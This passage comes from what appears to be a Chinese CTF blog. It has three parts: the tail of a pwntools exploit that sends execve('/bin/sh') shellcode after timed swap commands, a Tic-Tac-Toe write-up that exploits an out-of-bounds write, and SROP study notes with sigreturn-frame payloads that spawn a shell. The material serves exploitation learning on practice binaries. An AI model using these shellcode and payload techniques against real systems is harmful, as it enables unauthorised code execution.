记录处理顺序 (pos, times)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> unfinished:</span><br><span class="line">    best_pos = <span class="literal">None</span></span><br><span class="line">    best_tries = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">list</span>(unfinished):</span><br><span class="line">        target = TARGET[pos]</span><br><span class="line">        <span class="keyword">if</span> current_hand[pos] == target:</span><br><span class="line">            unfinished.remove(pos)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 从当前 rand_idx 开始找最早匹配</span></span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SWAP_TRIES):</span><br><span class="line">            idx = rand_idx + offset</span><br><span class="line">            <span class="keyword">if</span> idx &gt;= <span class="built_in">len</span>(future_rand):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> future_rand[idx] == target:</span><br><span class="line">                tries = offset + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> tries &lt; best_tries:</span><br><span class="line">                    best_tries = tries</span><br><span class="line">                    best_pos = pos</span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 找到最早的就停，不用再找更远的</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> best_pos <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!! 无法完成所有 tile，建议增大 MAX_SWAP_TRIES 或简化 TARGET&quot;</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 记录顺序和次数</span></span><br><span class="line">    execution_order.append((best_pos, best_tries))</span><br><span class="line">    swap_counts[best_pos] = best_tries</span><br><span class="line">    current_hand[best_pos] = TARGET[best_pos]</span><br><span class="line">    rand_idx += best_tries</span><br><span class="line">    unfinished.remove(best_pos)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nSwap 计划（贪心顺序）：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> idx, (pos, times) <span class="keyword">in</span> <span class="built_in">enumerate</span>(execution_order, <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> times &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;idx:2d&#125;</span>. tile <span class="subst">&#123;pos:2d&#125;</span> → <span class="subst">&#123;times&#125;</span> 次&quot;</span>)</span><br><span class="line"></span><br><span class="line">total = <span class="built_in">sum</span>(swap_counts)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;总 swap 次数：<span class="subst">&#123;total&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"><span class="comment"># 自动化发送 swap 指令</span></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始自动执行 swap 操作...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;总 swap 次数：<span class="subst">&#123;<span class="built_in">sum</span>(swap_counts)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pos, times <span class="keyword">in</span> execution_order:  <span class="comment"># 按贪心顺序</span></span><br><span class="line">    <span class="keyword">if</span> times &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;tile <span class="subst">&#123;pos:2d&#125;</span> 需要 swap <span class="subst">&#123;times&#125;</span> 次&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        <span class="comment"># 每次都完整发一次 &quot;1&quot; + tile</span></span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;(0-13): &quot;</span>, <span class="built_in">str</span>(pos).encode())</span><br><span class="line">        time.sleep(<span class="number">0.01</span> + random.uniform(<span class="number">0</span>, <span class="number">0.02</span>))<span class="comment"># 延迟调小一点，随机防检测</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;所有 swap 已发送完成！&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gdb.attach(p)</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 发送 play</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n已发送 Play！现在应该进入 read(0) 阶段&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动发送 execve /bin/sh shellcode</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = (</span><br><span class="line">    <span class="string">b&quot;\x48\x31\xd2&quot;</span>             <span class="comment"># xor rdx, rdx</span></span><br><span class="line">    <span class="string">b&quot;\x52&quot;</span>                     <span class="comment"># push rdx</span></span><br><span class="line">    <span class="string">b&quot;\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span>  <span class="comment"># mov rax, &quot;/bin//sh&quot;</span></span><br><span class="line">    <span class="string">b&quot;\x50&quot;</span>                     <span class="comment"># push rax</span></span><br><span class="line">    <span class="string">b&quot;\x48\x89\xe7&quot;</span>             <span class="comment"># mov rdi, rsp</span></span><br><span class="line">    <span class="string">b&quot;\x52&quot;</span>                     <span class="comment"># push rdx</span></span><br><span class="line">    <span class="string">b&quot;\x57&quot;</span>                     <span class="comment"># push rdi</span></span><br><span class="line">    <span class="string">b&quot;\x48\x89\xe6&quot;</span>             <span class="comment"># mov rsi, rsp</span></span><br><span class="line">    <span class="string">b&quot;\x48\x31\xc0&quot;</span>             <span class="comment"># xor rax, rax</span></span><br><span class="line">    <span class="string">b&quot;\xb0\x3b&quot;</span>                 <span class="comment"># mov al, 0x3b</span></span><br><span class="line">    <span class="string">b&quot;\x0f\x05&quot;</span>                 <span class="comment"># syscall</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>








      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/02/09/2026-02-09-Tic-Tac-Toe/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2026/02/09/2026-02-09-Tic-Tac-Toe/" class="post-title-link" itemprop="url">CTF题解：Tic-Tac-Toe</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2026-02-09 10:56:00 / Modified: 15:35:21" itemprop="dateCreated datePublished" datetime="2026-02-09T10:56:00+08:00">2026-02-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Tic-Tac-Toe"><a href="#Tic-Tac-Toe" class="headerlink" title="Tic-Tac-Toe"></a>Tic-Tac-Toe</h1><h2 id="一、题目分析"><a href="#一、题目分析" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><p>分析源码，winner &#x3D; checkWin()，只要player &#x3D;&#x3D; winner即可获得flag。当然，这里目标不是简单的下棋赢，因为玩家在这个程序里下井字棋要么输要么平局，我们需要找到另一种方式让winner &#x3D;&#x3D; player</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (winner == player) &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;How&#x27;s this possible? Well, I guess I&#x27;ll have to give you the flag now.\n&quot;</span>);</span><br><span class="line">   FILE* flag = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">   fgets(buf, <span class="number">256</span>, flag);</span><br><span class="line">   buf[<span class="built_in">strcspn</span>(buf, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">   <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Nice try, but I&#x27;m still unbeatable.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>首先查看一下程序如何判定winner。很明显，checkWin函数会返回 O 或 X，根据程序开头的定义：char player &#x3D; ‘X’;char computer &#x3D; ‘O’;，期望的返回值应该是X。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">checkWin</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (board[<span class="number">3</span>*i] == board[<span class="number">3</span>*i+<span class="number">1</span>] &amp;&amp; board[<span class="number">3</span>*i] == board[<span class="number">3</span>*i+<span class="number">2</span>] &amp;&amp; board[<span class="number">3</span>*i] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">         <span class="keyword">return</span> board[<span class="number">3</span>*i];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (board[i] == board[<span class="number">3</span>+i] &amp;&amp; board[i] == board[<span class="number">6</span>+i] &amp;&amp; board[i] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">         <span class="keyword">return</span> board[i];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (board[<span class="number">0</span>] == board[<span class="number">4</span>] &amp;&amp; board[<span class="number">0</span>] == board[<span class="number">8</span>] &amp;&amp; board[<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> board[<span class="number">0</span>];</span><br><span class="line">   <span class="keyword">if</span> (board[<span class="number">2</span>] == board[<span class="number">4</span>] &amp;&amp; board[<span class="number">2</span>] == board[<span class="number">6</span>] &amp;&amp; board[<span class="number">2</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> board[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>再看playerMove函数，index检查不严密，并且 board[index] &#x3D; player 会将player覆写对应索引的内存，于是想到能否通过计算获得一个index指向 char computer &#x3D; ‘O’，然后board[index] &#x3D; player将此处内存覆盖为 X，这样棋盘上将不会出现 O，checkWin函数的返回值永远是 X，winner &#x3D;&#x3D; player</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">playerMove</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">int</span> x, y;</span><br><span class="line">   <span class="keyword">do</span>&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter row #(1-3): &quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter column #(1-3): &quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;y);</span><br><span class="line">      <span class="type">int</span> index = (x<span class="number">-1</span>)*<span class="number">3</span>+(y<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">if</span>(index &gt;= <span class="number">0</span> &amp;&amp; index &lt; <span class="number">9</span> &amp;&amp; board[index] != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Invalid move.\n&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         board[index] = player; <span class="comment">// Should be safe, given that the user cannot overwrite tiles on the board</span></span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;<span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="二、漏洞"><a href="#二、漏洞" class="headerlink" title="二、漏洞"></a>二、漏洞</h2><p>接下来需要确定player和computer的内存布局，使用gdb调试。</p>
<p><img src="/images/26-02-09-Tic-Tac-Toe/%E5%86%85%E5%AD%98.png" alt="image-20260209152301225"></p>
<p>可以看到，在 -23 的位置就是 computer 的内存，playerMove函数里有 int index &#x3D; (x-1)*3+(y-1);，计算一下(x-1)3+(y-1)&#x3D;-23，可以让 x&#x3D;0 、y&#x3D;-19，输入即可将 computer 的内存改成X</p>
<p><img src="/images/26-02-09-Tic-Tac-Toe/%E5%86%85%E5%AD%982.png" alt="image-20260209152908305"></p>
<p>之后棋盘上就不会出现 O，随便下棋让 X 连成 3 个就可以赢，获得flag。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/02/05/2026-02-05-SROP%E6%8A%80%E6%9C%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2026/02/05/2026-02-05-SROP%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">学习笔记：SROP技术</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2026-02-05 10:00:00" itemprop="dateCreated datePublished" datetime="2026-02-05T10:00:00+08:00">2026-02-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2026-02-06 16:04:27" itemprop="dateModified" datetime="2026-02-06T16:04:27+08:00">2026-02-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SROP技术"><a href="#SROP技术" class="headerlink" title="SROP技术"></a>SROP技术</h1><h2 id="一、调试"><a href="#一、调试" class="headerlink" title="一、调试"></a>一、调试</h2><p>在学习SROP攻击之前，我们需要了解一下当 <em>向程序发出信号</em> 且 <em>程序有相应的信号处理程序</em> 时会发生什么</p>
<p>下面给出一个简单的程序，以便观察 signal 信号。使用以下命令编译代码<code>gcc signal.c -o signal</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Caught signal %d\n&quot;</span>, sig);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    signal(SIGINT, handler);   <span class="comment">// Ctrl+C 触发</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;running...\n&quot;</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们按下Ctrl + C，TTY 驱动检测到 INTR 字符 (^C)，内核生成 SIGINT，并发给“前台进程组”。本质上讲，Ctrl+C 默认会“退出程序”，因为 SIGINT 的默认行为 &#x3D; terminate，相当于 kill(getpid(), SIGINT)。当然，这里signal(SIGINT, handler)接收到信号后会跳转执行注册的 handler，作为一个 临时插入执行的函数 。</p>
<p>我们在gdb里打开这个程序，由于gdb也是前台进程组的一员，Ctrl+C不会发给调试的程序，所以在run前需要执行<code>handle SIGINT nostop noprint pass</code>，以便让程序接到signal。之后<code>b handler</code>，<code>r</code>，Ctrl+C</p>
<table>
<thead>
<tr>
<th>选项</th>
<th align="center">意思</th>
</tr>
</thead>
<tbody><tr>
<td><code>nostop</code></td>
<td align="center">GDB 不因 SIGINT 停下</td>
</tr>
<tr>
<td><code>noprint</code></td>
<td align="center">GDB 不打印 signal 信息</td>
</tr>
<tr>
<td><code>pass</code></td>
<td align="center">把 SIGINT 传给被调试程序</td>
</tr>
</tbody></table>
<p><img src="/images/26-01-31-SROP%E6%8A%80%E6%9C%AF/handler.png" alt="image-20260203212421796"></p>
<p>注意看上图 handler 的 ret 指令，handler 作为临时插入执行的函数，handler的 ret 理应返回到main，但是这里却返回到了 __restore_rt ，非常奇怪。</p>
<p>其实，在 SIGINT 到来之后（handler 之前），内核已经完成了：</p>
<ol>
<li>在用户栈上压入 signal frame（并非sub rsp，而是内核改 regs-&gt;rsp）</li>
<li>在 frame 里保存所有寄存器</li>
<li>把 RIP 改成 handler</li>
<li>把“返回地址”设为 __restore_rt</li>
<li>切到用户态执行 handler</li>
</ol>
<p>这里 __restore_rt 的唯一功能就是触发 rt_sigreture 系统调用，让内核用当前栈上的 signal frame 恢复寄存器。我尝试si步入观察syscall之后的指令，但是执行完这条后会直接进入sleep，原因是rt_sigreturn不会返回到 syscall 的下一条指令，它是一步之内“原子级完成”的，所以可以说：</p>
<blockquote>
<p><code>rt_sigreturn</code> 的“参数”是整个栈</p>
</blockquote>
<p>另外需要注意这里<code>mov rax , 0xf</code>，<code>syscall</code>,我们SROP使用的就是这里的系统调用号0xf(15)，来调用SYS_rt_sigreturn。</p>
<p>下面探究一下整个 signal 机制，对SROP攻击不是很重要，仅用于加深理解。</p>
<p>平时C语言写的<code>signal(SIGINT, handler)</code> ，起始只是对 <code>rt_sigaction</code> 的一层“老接口封装”，这个过程可以称为”注册”，就是告诉内核当接收到SIGINT时，去执行handler，而非SIGINT 默认的处理方式 kill</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">signal()</span><br><span class="line">  ↓</span><br><span class="line">__sigaction()</span><br><span class="line">  ↓</span><br><span class="line">rt_sigaction   ← syscall 13</span><br></pre></td></tr></table></figure>

<p>之前讲到：</p>
<blockquote>
<p>“当我们按下Ctrl + C，TTY 驱动检测到 INTR 字符 (^C)，内核生成 SIGINT，并发给“前台进程组”</p>
</blockquote>
<p>更精确讲，内核生成 SIGINT 就是把 SIGINT 对应的 bit 置进目标进程（&#x2F;线程）的 pending 集合里。这一步叫做 signal pending（信号挂起），此时只是有一个标记，不会让内核立即执行压入 signal frame 等操作。</p>
<p>之后内核会在某个安全点（比如从 syscall 返回用户态）检查：有没有 pending signal；有没有被屏蔽；有没有注册 handler。这一步叫做 signal delivery（信号传递），完成上面压入 signal frame 那5步。</p>
<p>总结一下</p>
<blockquote>
<p><code>rt_sigaction</code> 注册 signal 规则，告诉内核遇到SIGINT要去handler；<br> Ctrl+C 产生 SIGINT → 标记 pending；<br> 内核在安全点 delivery 信号，构造 rt_sigframe，跳转 handler；<br> handler 返回后通过 <code>rt_sigreturn</code> 恢复寄存器。</p>
</blockquote>
<p>SROP 本质上就是： 伪造 pending 已经被处理之后的那一帧。</p>
<h2 id="二、例子"><a href="#二、例子" class="headerlink" title="二、例子"></a>二、例子</h2><p>接下来我们尝试完成一个SROP攻击。使用以下命令编译汇编代码，<code>gcc -no-pie srop.S -z noexecstack -o srop</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.global main</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">.text</span><br><span class="line">main:</span><br><span class="line">sub rsp,0x200</span><br><span class="line">mov eax,0</span><br><span class="line">mov edi,0</span><br><span class="line">lea rsi,[rsp]</span><br><span class="line">mov edx,0x400</span><br><span class="line">syscall</span><br><span class="line">add rsp,0x200</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>首先执行checksec查看保护，没有canary和pie，不用考虑信息泄露。反汇编main函数，可以看出程序实现了一个read功能，读取0x400字节，但只分配了0x200，存在栈溢出。</p>
<p><img src="/images/26-01-31-SROP%E6%8A%80%E6%9C%AF/disas.png" alt="image-20260204113651151"></p>
<p>对于 signal 信号，我们不能像之前那样通过Ctrl+C触发，因为它会直接 kiil 这个进程，所以我们需要通过syscall来触发一个 SYS_rt_sigreturn，用于恢复寄存器。</p>
<p>首先，我们需要通过函数返回值让 rax &#x3D; 15，得到一个 sigreturn 的 syscall，并且构造一个 read 的 sigframe。这里构造 read 的 sigframe是因为没有现成的&#x2F;bin&#x2F;sh，我们需要栈迁移到可写段并写入&#x2F;bin&#x2F;sh，以获得&#x2F;bin&#x2F;sh可控地址。我们如下构造payload。</p>
<p>这里我们通过 pwntools 的 SigreturnFrame() 快速构造 sigframe，简单讲就是给各个寄存器一个合适的值（放在栈上，通过sigreturn还原）。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">read_addr  = <span class="number">0x401106</span></span><br><span class="line">syscall    = <span class="number">0x401120</span></span><br><span class="line">pivot_addr = <span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x200</span></span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">frame0 = SigreturnFrame()</span><br><span class="line">frame0.rax = <span class="number">0</span> <span class="comment"># read syscall</span></span><br><span class="line">frame0.rdi = <span class="number">0</span> <span class="comment"># fd = 0</span></span><br><span class="line">frame0.rsi = pivot_addr <span class="comment"># writable section available</span></span><br><span class="line">frame0.rsp = pivot_addr</span><br><span class="line">frame0.rdx = <span class="number">0x500</span> <span class="comment"># count</span></span><br><span class="line">frame0.rip = syscall <span class="comment"># syscall addr</span></span><br><span class="line">payload += <span class="built_in">bytes</span>(frame0)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>) <span class="comment"># rax = 15 (sigreturn)</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/26-01-31-SROP%E6%8A%80%E6%9C%AF/explain.png" alt="image-20260206144654613"></p>
<p>如上，在 sigreturn 之后，寄存器会通过 sigframe 设置成期望值，并调用 read。此时，栈迁移完成，我们需要读入&#x2F;bin&#x2F;sh，并再次覆盖返回地址构造 sigreturn 和 sigframe，这次的sigframe 构造 execve 即可。我们如下构造payload。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + cyclic(<span class="number">0x200</span>-<span class="built_in">len</span>(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)) <span class="comment"># padding</span></span><br><span class="line">payload += p64(read_addr) </span><br><span class="line">payload += p64(syscall) </span><br><span class="line"></span><br><span class="line">frame1=SigreturnFrame()</span><br><span class="line">frame1.rax = <span class="number">59</span> <span class="comment"># execve syscall</span></span><br><span class="line">frame1.rsi = <span class="number">0</span> <span class="comment"># argv</span></span><br><span class="line">frame1.rdx = <span class="number">0</span> <span class="comment"># envp</span></span><br><span class="line">frame1.rdi = pivot_addr <span class="comment"># contains string /bin/sh</span></span><br><span class="line">frame1.rip = syscall</span><br><span class="line">payload += <span class="built_in">bytes</span>(frame1)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span 